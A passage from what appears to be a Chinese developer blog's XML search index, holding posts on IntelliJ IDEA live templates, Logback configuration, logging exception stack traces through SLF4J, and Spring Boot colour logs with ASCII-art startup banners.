value="logger.debug(&amp;quot;$END$&amp;quot;);" description="log日志debug级别" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="can" value="java.util.Scanner in = new java.util.Scanner(System.in);&amp;#10;int n = in.nextInt();&amp;#10;$END$" description="控制台输入" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="pra" value="java.util.Arrays.toString($END$)" description="打印数组" toReformat="false" toShortenFQNames="true"&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt; &lt;template name="prm" value="for(java.util.Map.Entry entry : $VAR$.entrySet())&#123;&amp;#10; System.out.println(entry.getKey()+&amp;quot; : &amp;quot;+entry.getValue());&amp;#10;&#125;" description="打印Map集合" toReformat="false" toShortenFQNames="true"&gt; &lt;variable name="VAR" expression="" defaultValue="" alwaysStopAt="true" /&gt; &lt;context&gt; &lt;option name="JAVA_CODE" value="true" /&gt; &lt;/context&gt; &lt;/template&gt;&lt;/templateSet&gt; 参考资料 IntelliJ IDEA 2017.2.5 中文输入后,输入框文字不随指针显示问题]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Logback日志配置]]></title>
    <url>%2Fposts%2FLogback_xml_configuration.html</url>
    <content type="text"><![CDATA[前言回想以前都是用 System.out.println 作为调试的主要手段的, 但是当部署到服务器时, 我们不可能一直盯着控制台看, 并且这种方法也不能进行分级输出。 System.out.println 也就满足不了需求了。Logback 是一个 Java 领域的日志框架。它被认为是 Log4J 的继承人，实现了 SLF4J 标准。反正就是个特好用的东西。 导入maven slf4j-api logback-classic : 包含了slf4j-api、logback-core logback-ext-spring: 提供的对Spring的支持 jcl-over-slf4j: 打印Spring框架本身打印的日志 Spring 配置1234567&lt;listener&gt; &lt;listener-class&gt;ch.qos.logback.ext.spring.web.LogbackConfigListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;context-param&gt; &lt;param-name&gt;logbackConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:logback.xml&lt;/param-value&gt; &lt;/context-param&gt; Spring Boot直接放在 resource/logback.xml即可, 会自动配置加载。 logback.xml直接复制粘贴进去即可, 一些基本常识请看官方文档或下面的参考资料。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration debug="false"&gt; &lt;!-- 上下文名称 --&gt; &lt;property name="log.context.name" value="MyApp" /&gt; &lt;!-- log编码 --&gt; &lt;property name="log.charset" value="UTF-8" /&gt; &lt;!-- log文件最大历史 --&gt; &lt;property name="log.history.max" value="30" /&gt; &lt;!-- log文件输出路径, 相对路径LOG在Tomcat 8.5\bin\LOG下, 绝对路径/LOG在D:\LOG下 --&gt; &lt;!-- 推荐绝对路径 --&gt; &lt;property name="log.path" value="LOG" /&gt; &lt;!-- Log4j: [S][%d&#123;yyyyMMdd HH:mm:ss&#125;][%-5p][%C:%L] - %m%n --&gt; &lt;!--格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度%msg：日志消息，%n是换行符--&gt; &lt;property name="log.pattern" value="%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n" /&gt; &lt;property name="log.pattern.short" value="%date&#123;yyyyMMdd HH:mm:ss.SSS&#125;-%msg%n" /&gt; &lt;!-- 设置上下文名称 --&gt; &lt;contextName&gt;$&#123;log.context.name&#125;&lt;/contextName&gt; &lt;!-- 输出到控制台 --&gt; &lt;!-- appender用于输出log日志, name是appender的唯一标识, class指定实现类 --&gt; &lt;appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!-- encoder是编码器, charset指定编码格式 --&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;!-- 输出日志的格式, 在上面有提到 --&gt; &lt;pattern&gt;$&#123;log.pattern&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name="STDOUT_SHORT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern.short&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- 输出到文件 --&gt; &lt;!-- ERROR级别日志 --&gt; &lt;!-- 滚动记录文件，先将日志记录到指定文件，当符合某个条件时，将日志记录到其他文件 RollingFileAppender--&gt; &lt;appender name="FILE_ERROR" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 过滤器，只记录ERROR级别的日志 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;!-- 匹配则处理这个日志, 不经过其他过滤器 --&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;!-- 不匹配则抛弃这个日志 --&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;!-- 最常用的滚动策略，它根据时间来制定滚动策略.既负责滚动也负责出发滚动 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--日志输出位置 可相对、和绝对路径 --&gt; &lt;fileNamePattern&gt;$&#123;log.path&#125;/error/log.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;!-- 可选节点，控制保留的归档文件的最大数量，超出数量就删除旧文件假设设置每个月滚动，且&lt;maxHistory&gt;是6， 则只保存最近6个月的文件，删除之前的旧文件。注意，删除旧文件是，那些为了归档而创建的目录也会被删除--&gt; &lt;maxHistory&gt;$&#123;log.history.max&#125;&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- WARN级别日志 appender --&gt; &lt;appender name="FILE_WARN" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 过滤器，只记录WARN级别的日志 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;WARN&lt;/level&gt; &lt;!-- 匹配则处理这个日志, 不经过其他过滤器 --&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;!-- 不匹配则抛弃这个日志 --&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;!-- 最常用的滚动策略，它根据时间来制定滚动策略.既负责滚动也负责出发滚动 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--日志输出位置 可相对、和绝对路径 --&gt; &lt;fileNamePattern&gt;$&#123;log.path&#125;/warn/log.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;!-- 可选节点，控制保留的归档文件的最大数量，超出数量就删除旧文件假设设置每个月滚动，且&lt;maxHistory&gt;是6， 则只保存最近6个月的文件，删除之前的旧文件。注意，删除旧文件是，那些为了归档而创建的目录也会被删除--&gt; &lt;maxHistory&gt;$&#123;log.history.max&#125;&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- INFO级别日志 appender --&gt; &lt;appender name="FILE_INFO" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 过滤器，只记录INFO级别的日志 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;INFO&lt;/level&gt; &lt;!-- 匹配则处理这个日志, 不经过其他过滤器 --&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;!-- 不匹配则抛弃这个日志 --&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;!-- 最常用的滚动策略，它根据时间来制定滚动策略.既负责滚动也负责出发滚动 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--日志输出位置 可相对、和绝对路径 --&gt; &lt;fileNamePattern&gt;$&#123;log.path&#125;/info/log.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;!-- 可选节点，控制保留的归档文件的最大数量，超出数量就删除旧文件假设设置每个月滚动，且&lt;maxHistory&gt;是6， 则只保存最近6个月的文件，删除之前的旧文件。注意，删除旧文件是，那些为了归档而创建的目录也会被删除--&gt; &lt;maxHistory&gt;$&#123;log.history.max&#125;&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- DEBUG级别日志 appender --&gt; &lt;appender name="FILE_DEBUG" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 过滤器，只记录DEBUG级别的日志 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;DEBUG&lt;/level&gt; &lt;!-- 匹配则处理这个日志, 不经过其他过滤器 --&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;!-- 不匹配则抛弃这个日志 --&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;!-- 最常用的滚动策略，它根据时间来制定滚动策略.既负责滚动也负责出发滚动 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--日志输出位置 可相对、和绝对路径 --&gt; &lt;fileNamePattern&gt;$&#123;log.path&#125;/debug/log.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;!-- 可选节点，控制保留的归档文件的最大数量，超出数量就删除旧文件假设设置每个月滚动，且&lt;maxHistory&gt;是6， 则只保存最近6个月的文件，删除之前的旧文件。注意，删除旧文件是，那些为了归档而创建的目录也会被删除--&gt; &lt;maxHistory&gt;$&#123;log.history.max&#125;&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- TRACE级别日志 appender --&gt; &lt;appender name="FILE_TRACE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 过滤器，只记录TRACE级别的日志 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;TRACE&lt;/level&gt; &lt;!-- 匹配则处理这个日志, 不经过其他过滤器 --&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;!-- 不匹配则抛弃这个日志 --&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;!-- 最常用的滚动策略，它根据时间来制定滚动策略.既负责滚动也负责出发滚动 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--日志输出位置 可相对、和绝对路径 --&gt; &lt;fileNamePattern&gt;$&#123;log.path&#125;/trace/log.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;!-- 可选节点，控制保留的归档文件的最大数量，超出数量就删除旧文件假设设置每个月滚动，且&lt;maxHistory&gt;是6， 则只保存最近6个月的文件，删除之前的旧文件。注意，删除旧文件是，那些为了归档而创建的目录也会被删除--&gt; &lt;maxHistory&gt;$&#123;log.history.max&#125;&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- 项目日志级别 --&gt; &lt;logger name="com.apache.ibatis" level="TRACE"/&gt; &lt;logger name="java.sql.Connection" level="DEBUG"/&gt; &lt;logger name="java.sql.Statement" level="DEBUG"/&gt; &lt;logger name="java.sql.PreparedStatement" level="DEBUG"/&gt; &lt;logger name="com.ahao.project" level="INFO"/&gt; &lt;!-- root级别 INFO --&gt; &lt;root level="INFO"&gt; &lt;!-- 控制台输出 --&gt; &lt;appender-ref ref="STDOUT" /&gt; &lt;!-- 文件输出 --&gt; &lt;appender-ref ref="FILE_ERROR" /&gt; &lt;appender-ref ref="FILE_INFO" /&gt; &lt;appender-ref ref="FILE_WARN" /&gt; &lt;appender-ref ref="FILE_DEBUG" /&gt; &lt;appender-ref ref="FILE_TRACE" /&gt; &lt;/root&gt;&lt;/configuration&gt; 参考资料 logback 中文手册下载 logback 常用配置详解（序）logback 简介]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Logback</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Logback输出异常堆栈]]></title>
    <url>%2Fposts%2FLogback_how_to_output_exception_stack.html</url>
    <content type="text"><![CDATA[前言今天来到公司, 老大和我说SpringBoot的短信项目没有日志输出, 赶紧火急火燎的排错。 先排查logback.xml1234567891011&lt;!-- root级别 INFO --&gt;&lt;root level="INFO"&gt; &lt;!-- 控制台输出 --&gt; &lt;appender-ref ref="STDOUT" /&gt; &lt;!-- 文件输出 --&gt; &lt;appender-ref ref="FILE_TRACE" /&gt; &lt;appender-ref ref="FILE_DEBUG" /&gt; &lt;appender-ref ref="FILE_INFO" /&gt; &lt;appender-ref ref="FILE_WARN" /&gt; &lt;appender-ref ref="FILE_ERROR" /&gt;&lt;/root&gt; 日志输出级别是 INFO, 按理是没什么问题的, 为了稳妥起见, 改为 DEBUG。1234567891011&lt;!-- root级别 DEBUG --&gt;&lt;root level="DEBUG"&gt; &lt;!-- 控制台输出 --&gt; &lt;appender-ref ref="STDOUT" /&gt; &lt;!-- 文件输出 --&gt; &lt;appender-ref ref="FILE_TRACE" /&gt; &lt;appender-ref ref="FILE_DEBUG" /&gt; &lt;appender-ref ref="FILE_INFO" /&gt; &lt;appender-ref ref="FILE_WARN" /&gt; &lt;appender-ref ref="FILE_ERROR" /&gt;&lt;/root&gt; 检查application.yml12345# 日志 配置logging: level: com.nine.rivers.galaxy: info org.springframework: warn 发现了这一段, 估计是在摸石头过河阶段加入的, 后来用 logback.xml 的时候没有删除掉。有句话说得好, 如果你自己都搞不清楚程序要做什么, 程序自己肯定也会搞糊涂统一一个日志配置文件, 把 application.yml 中的这一段删掉。 异常日志输出改完后发现普通的日志输出没有问题, 但是不能输出异常堆栈。123456try &#123; // do Something&#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); // 注意这里 logger.error("反射获取参数错误, 请检查field的权限修饰符:" + e.getMessage());&#125; 在使用 System.out.println() 输出日志的阶段, 我一直都是使用 e.printStackTrace() 输出的。改用 log 输出日志之后, 没有意识到 e.printStackTrace() 其实是 System.err.println(), 没有输出到日志。改为如下代码即可。12345try &#123; // do Something&#125; catch (IllegalAccessException e) &#123; logger.error("反射获取参数错误, 请检查field的权限修饰符:", e);&#125; 初探源码e.printStackTrace() 这个方法是在父类 Throwable 中实现的。很明显看到 System.err 的字样。更深入异常的体系结构暂不分析。123456789101112131415161718192021222324252627282930313233343536373839// java.lang.Throwablepublic class Throwable implements Serializable &#123; public void printStackTrace() &#123; // 是不是和System.out很像 // 调用第9行的代码 printStackTrace(System.err); &#125; public void printStackTrace(PrintStream s) &#123; // WrappedPrintStream 是 Throwable 的私有静态内部类, 包装了一个PrintStream对象 // 调用第15行的代码 printStackTrace(new WrappedPrintStream(s)); &#125; private void printStackTrace(PrintStreamOrWriter s) &#123; // Guard against malicious overrides of Throwable.equals by // using a Set with identity equality semantics. Set&lt;Throwable&gt; dejaVu = Collections.newSetFromMap(new IdentityHashMap&lt;Throwable, Boolean&gt;()); dejaVu.add(this); synchronized (s.lock()) &#123; // 打印自身 s.println(this); StackTraceElement[] trace = getOurStackTrace(); for (StackTraceElement traceElement : trace) // 打印当前的异常信息 s.println("\tat " + traceElement); // 打印被抑制（可能是try住的）的所有的异常信息 for (Throwable se : getSuppressed()) se.printEnclosedStackTrace(s, trace, SUPPRESSED_CAPTION, "\t", dejaVu); // 打印异常的原因 Throwable ourCause = getCause(); if (ourCause != null) ourCause.printEnclosedStackTrace(s, trace, CAUSE_CAPTION, "", dejaVu); &#125; &#125;&#125;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Logback</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot彩色日志的配置]]></title>
    <url>%2Fposts%2FSpring_Boot_color_log_configuration.html</url>
    <content type="text"><![CDATA[前言 Spring Boot提供了彩色日志的功能, 可以达到上面的效果 logback.xml在 resource 文件夹加入 logback.xml, Spring Boot 会自动去加载配置文件。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration debug="false"&gt; &lt;!-- 设置上下文名称 --&gt; &lt;contextName&gt;$&#123;log.context.name&#125;&lt;/contextName&gt; &lt;!--定义日志文件的存储地址 勿在 LogBack 的配置中使用相对路径--&gt; &lt;property name="LOG_PATH" value="/LOG" /&gt; &lt;property name="log.context.name" value="MyApp" /&gt; &lt;property name="log.charset" value="UTF-8" /&gt; &lt;!-- Log4j: [S][%d&#123;yyyyMMdd HH:mm:ss&#125;][%-5p][%C:%L] - %m%n --&gt; &lt;!--格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度%msg：日志消息，%n是换行符--&gt; &lt;property name="log.pattern" value="%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n" /&gt; &lt;property name="log.pattern.short" value="%date&#123;yyyyMMdd HH:mm:ss.SSS&#125;-%msg%n" /&gt; &lt;!-- 彩色日志格式 --&gt; &lt;property name="log.pattern.color" value="$&#123;CONSOLE_LOG_PATTERN:-%clr(%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125;)&#123;faint&#125; %clr($&#123;LOG_LEVEL_PATTERN:-%5p&#125;) %clr($&#123;PID:- &#125;)&#123;magenta&#125; %clr(---)&#123;faint&#125; %clr([%15.15t])&#123;faint&#125; %clr(%-40.40logger&#123;39&#125;)&#123;cyan&#125; %clr(:)&#123;faint&#125; %m%n$&#123;LOG_EXCEPTION_CONVERSION_WORD:-%wEx&#125;&#125;" /&gt; &lt;!-- 控制台输出 --&gt; &lt;appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name="STDOUT_SHORT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern.short&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- 彩色日志 --&gt; &lt;!-- 彩色日志依赖的渲染类 --&gt; &lt;conversionRule conversionWord="clr" converterClass="org.springframework.boot.logging.logback.ColorConverter" /&gt; &lt;conversionRule conversionWord="wex" converterClass="org.springframework.boot.logging.logback.WhitespaceThrowableProxyConverter" /&gt; &lt;conversionRule conversionWord="wEx" converterClass="org.springframework.boot.logging.logback.ExtendedWhitespaceThrowableProxyConverter" /&gt; &lt;!-- Console 输出设置 --&gt; &lt;appender name="STDOUT_COLOR" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder charset="$&#123;log.charset&#125;"&gt; &lt;pattern&gt;$&#123;log.pattern.color&#125;&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--mybatis log configure--&gt; &lt;logger name="com.apache.ibatis" level="TRACE"/&gt; &lt;logger name="java.sql.Connection" level="DEBUG"/&gt; &lt;logger name="java.sql.Statement" level="DEBUG"/&gt; &lt;logger name="java.sql.PreparedStatement" level="DEBUG"/&gt; &lt;!-- 日志输出级别 --&gt; &lt;root level="INFO"&gt; &lt;appender-ref ref="STDOUT_COLOR" /&gt; &lt;/root&gt;&lt;/configuration&gt; 在application.yml启用彩色日志1spring.output.ansi.enabled: detect spring.output.ansi.enabled 有三个候选项 NEVER：禁用ANSI-colored输出（默认项） DETECT：会检查终端是否支持ANSI，是的话就采用彩色输出（推荐项） ALWAYS：总是使用ANSI-colored格式输出，若终端不支持的时候，会有很多干扰信息，不推荐使用 Tomcat不支持彩色日志直接运行 main 函数的话,日志可以彩色输出, 但是在IDEA部署到 Tomcat 的时候, IDEA的控制台没有彩色日志, 如果强制打开彩色日志, 则会出现很多干扰信息。 IDEA提供了个曲线救国的插件Grep Console, 安装即可, 在IDEA的控制台渲染彩色日志, 在Tomcat不显示彩色日志。 如果在Linux上使用, 还有另一种曲线救国的方法。这种就不详细讨论了。Linux 日志高亮工具 CCZE 有趣的Banner使用过Spring Boot就会发现每次项目启动时，控制台都会有一个大大的Spring的字符画。Spring Boot也提供了自定义的方法, 在 resource/banner.txt 写入想显示的字符画, 就可以自动加载并显示出来。注意Tomcat不支持彩色日志 佛祖保佑12345678910111213141516171819202122////////////////////////////////////////////////////////////////////// _ooOoo_ //// o8888888o //// 88&quot; . &quot;88 //// (| ^_^ |) //// O\ = /O //// ____/`---&apos;\____ //// .&apos; \\| |// `. //// / \\||| : |||// \ //// / _||||| -:- |||||- \ //// | | \\\ - /// | | //// | \_| &apos;&apos;\---/&apos;&apos; | | //// \ .-\__ `-` ___/-. / //// ___`. .&apos; /--.--\ `. . ___ //// .&quot;&quot; &apos;&lt; `.___\_&lt;|&gt;_/___.&apos; &gt;&apos;&quot;&quot;. //// | | : `- \`.;`\ _ /`;.`/ - ` : | | //// \ \ `-. \_ __\ /__ _/ .-` / / //// ========`-.____`-.___\_____/___.-`____.-&apos;======== //// `=---=&apos; //// ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //// 佛祖保佑 永不宕机 永无BUG ////////////////////////////////////////////////////////////////////// jhipster(不支持Tomcat)123456$&#123;AnsiColor.GREEN&#125; ██╗$&#123;AnsiColor.RED&#125; ██╗ ██╗ ████████╗ ███████╗ ██████╗ ████████╗ ████████╗ ███████╗$&#123;AnsiColor.GREEN&#125; ██║$&#123;AnsiColor.RED&#125; ██║ ██║ ╚══██╔══╝ ██╔═══██╗ ██╔════╝ ╚══██╔══╝ ██╔═════╝ ██╔═══██╗$&#123;AnsiColor.GREEN&#125; ██║$&#123;AnsiColor.RED&#125; ████████║ ██║ ███████╔╝ ╚█████╗ ██║ ██████╗ ███████╔╝$&#123;AnsiColor.GREEN&#125;██╗ ██║$&#123;AnsiColor.RED&#125; ██╔═══██║ ██║ ██╔════╝ ╚═══██╗ ██║ ██╔═══╝ ██╔══██║$&#123;AnsiColor.GREEN&#125;╚██████╔╝$&#123;AnsiColor.RED&#125; ██║ ██║ ████████╗ ██║ ██████╔╝ ██║ ████████╗ ██║ ╚██╗$&#123;AnsiColor.GREEN&#125; ╚═════╝ $&#123;AnsiColor.RED&#125; ╚═╝ ╚═╝ ╚═══════╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══════╝ ╚═╝ ╚═╝ 彩虹猫(不支持Tomcat)12345678910111213141516171819202122$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████████████████████████████████████████████████████████████████████████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████████████████████████████████████████████████████████████████████████$&#123;AnsiColor.RED&#125;██████████████████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████████$&#123;AnsiColor.BLACK&#125;██████████████████████████████$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████████$&#123;AnsiColor.RED&#125;████████████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;██████████████$&#123;AnsiColor.BRIGHT_RED&#125;████$&#123;AnsiColor.RED&#125;██████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.MAGENTA&#125;██████████████████████$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;████████████$&#123;AnsiColor.BRIGHT_RED&#125;██████████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.MAGENTA&#125;████████████████$&#123;AnsiColor.BLACK&#125;████$&#123;AnsiColor.MAGENTA&#125;██████$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;██$&#123;AnsiColor.BLACK&#125;████$&#123;AnsiColor.BRIGHT_BLUE&#125;██████$&#123;AnsiColor.BRIGHT_RED&#125;██████████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.MAGENTA&#125;██████$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.BLACK&#125;████$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;████$&#123;AnsiColor.BRIGHT_YELLOW&#125;██████████████████$&#123;AnsiColor.BRIGHT_RED&#125;████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.MAGENTA&#125;██████$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;████$&#123;AnsiColor.BRIGHT_YELLOW&#125;██████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_YELLOW&#125;██████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.BLACK&#125;████████$&#123;AnsiColor.WHITE&#125;████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;████$&#123;AnsiColor.BRIGHT_YELLOW&#125;████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_YELLOW&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;████$&#123;AnsiColor.BRIGHT_GREEN&#125;██████████████████$&#123;AnsiColor.BRIGHT_YELLOW&#125;██$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.BLACK&#125;████████$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;██████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████████████████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;██$&#123;AnsiColor.BRIGHT_GREEN&#125;██████████████████████$&#123;AnsiColor.WHITE&#125;████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;██████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.BRIGHT_YELLOW&#125;██$&#123;AnsiColor.WHITE&#125;██████████$&#123;AnsiColor.BRIGHT_YELLOW&#125;██$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;██$&#123;AnsiColor.BRIGHT_GREEN&#125;██████████████████████$&#123;AnsiColor.BLACK&#125;████$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.MAGENTA&#125;██████████████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.WHITE&#125;██$&#123;AnsiColor.BLACK&#125;████$&#123;AnsiColor.WHITE&#125;████$&#123;AnsiColor.BLACK&#125;██$&#123;AnsiColor.BRIGHT_BLUE&#125;██$&#123;Ansi